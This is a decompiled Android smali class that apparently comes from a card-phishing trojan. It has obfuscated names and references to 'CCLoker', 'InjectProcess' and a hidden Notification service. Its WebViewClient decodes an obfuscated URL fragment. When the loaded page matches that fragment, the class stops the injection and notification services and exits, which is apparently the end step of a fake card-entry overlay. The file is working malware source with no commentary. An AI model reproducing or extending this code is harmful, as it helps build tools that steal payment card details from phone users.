.class Lcompse/refact/st/upsssss/wrrgehehehehe;
.super Landroid/webkit/WebViewClient;


# instance fields
.field final synthetic fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/CCLoker$mainActivity;


# direct methods
.method constructor <init>(Lcompse/refact/st/upsssss/CCLoker$mainActivity;)V
    .locals 0

    iput-object p1, p0, Lcompse/refact/st/upsssss/wrrgehehehehe;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/CCLoker$mainActivity;

    invoke-direct {p0}, Landroid/webkit/WebViewClient;-><init>()V

    return-void
.end method


# virtual methods
.method public shouldOverrideUrlLoading(Landroid/webkit/WebView;Ljava/lang/String;)Z
    .locals 5

    const/4 v4, 0x1

    const-string v0, "Z)F-Ag\u001drB1S$\u001c:]2U1WsQ2_rS-B."

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/h;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcompse/refact/st/upsssss/wrrgehehehehe;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/CCLoker$mainActivity;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcompse/refact/st/upsssss/wrrgehehehehe;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/CCLoker$mainActivity;

    const-class v3, Lcompse/refact/st/upsssss/Notification;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->stopService(Landroid/content/Intent;)Z

    iget-object v0, p0, Lcompse/refact/st/upsssss/wrrgehehehehe;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/CCLoker$mainActivity;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcompse/refact/st/upsssss/wrrgehehehehe;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/CCLoker$mainActivity;

    const-class v3, Lcompse/refact/st/upsssss/InjectProcess;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Lcompse/refact/st/upsssss/CCLoker$mainActivity;->stopService(Landroid/content/Intent;)Z

    invoke-static {v4}, Ljava/lang/System;->exit(I)V

    :cond_0
    return v4
.end method
